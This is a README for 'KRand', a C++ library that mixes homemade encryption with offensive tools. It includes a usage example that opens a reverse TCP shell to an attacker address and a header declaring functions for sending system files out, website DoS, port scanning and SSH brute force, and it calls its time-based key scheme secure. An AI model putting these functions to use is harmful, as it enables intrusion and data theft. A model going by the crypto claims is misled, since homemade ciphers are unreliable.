# KRand

## Overview
KRand is a cybersecurity and cryptography library designed for encryption, networking, and security research. It provides various cryptographic functionalities, networking tools, and attack simulations, making it useful for penetration testing and cybersecurity education.

## Features
- 🔐 **Encryption & Decryption**: Time-based key generation, AES-like encryption, and decryption.
- 🔑 **RSA Key Management**: Generate key pairs, encrypt and decrypt data with RSA keys.
- 📂 **File Security**: Encrypt and decrypt files securely using RSA keys.
- 🌐 **Networking & Reverse Shell**: Send system files, create a reverse TCP connection, and communicate with an attacker.
- 🚀 **Cybersecurity & Attack Simulations**:
  - Denial of Service (DoS) attack.
  - Port scanning (basic & advanced).
  - Packet sniffing & vulnerability scanning.
  - SSH brute-force attack.
  - Network enumeration.

## Installation

```sh
# Clone the repository
git clone https://github.com/Kalasaikamesh944/KRand.git
cd KRand

# Build using CMake
mkdir build && cd build
cmake ..
make

# Install to system (optional)
sudo make install
```

## Usage

### Include KRand in Your Project
```cpp
#include <KRand.h>
```

### Example: Encrypt and Decrypt Data
```cpp
#include "KRand.h"
#include <iostream>

int main() {
    std::string key = KRand::generate_time_based_key();
    std::string encrypted = KRand::encrypt("Hello, World!", key);
    std::string decrypted = KRand::decrypt(encrypted, key);

    std::cout << "Encrypted: " << encrypted << "\n";
    std::cout << "Decrypted: " << decrypted << "\n";
    return 0;
}
```

### Example: Reverse TCP
```cpp
KRand krand;
krand.reverse_tcp("192.168.1.100", 4444);
```

## Full Header File (`KRand.h`)
```cpp
/***
MIT License

Copyright (c) 2025 Kalasaikamesh944

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
***/

#ifndef KRAND_H
#define KRAND_H

#include <iostream>
#include <string>

#ifdef _WIN32
    #include <winsock2.h>
    #pragma comment(lib, "ws2_32.lib")  // Windows Sockets for Windows
#else
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <unistd.h>
#endif

class KRand {
public:
    KRand();   // Constructor
    ~KRand();  // Destructor
    
    /*** 🔐 Encryption & Decryption Functions ***/
    static std::string generate_time_based_key();
    static std::string encrypt(const std::string &plaintext, const std::string &key);
    static std::string decrypt(const std::string &ciphertext, const std::string &key);

    /*** 🔑 RSA Key Pair Functions ***/
    void generate_key_pair(const std::string &public_key_file, const std::string &private_key_file);
    std::string encrypt_with_public_key(const std::string &data, const std::string &public_key_file);
    std::string decrypt_with_private_key(const std::string &encrypted_data, const std::string &private_key_file);

    /*** 📂 File Encryption & Decryption ***/
    void encrypt_file(const std::string &input_file, const std::string &output_file, const std::string &public_key_file);
    void decrypt_file(const std::string &input_file, const std::string &output_file, const std::string &private_key_file);

    /*** 🌐 Networking & Reverse Shell ***/
    void send_system_files_to_client(const std::string &client_ip, int client_port);
    void reverse_tcp(const std::string &attacker_ip, int attacker_port);
    void send_message_to_attacker(const std::string &attacker_ip, int attacker_port, const std::string &message);

    /*** 🚀 Cybersecurity & Attack Simulations ***/
    void do_dos_website(const std::string &target_url, bool loop, int count, int delay_ms);
    void port_scan(const std::string &target_ip, int start_port, int end_port);

    /*** 🔎 Advanced Features (Planned) ***/
    void advanced_port_scan(const std::string &target_ip);
    void packet_sniffing(std::string &interface);
    void vulnerability_scan();
    void ssh_brute_force(const std::string &target_ip, const std::string &user, const std::string &password_list);
    void network_enumeration(const std::string &network_range);
};

#endif  // KRAND_H
```

## License
This project is licensed under the MIT License. See the `LICENSE` file for more details.

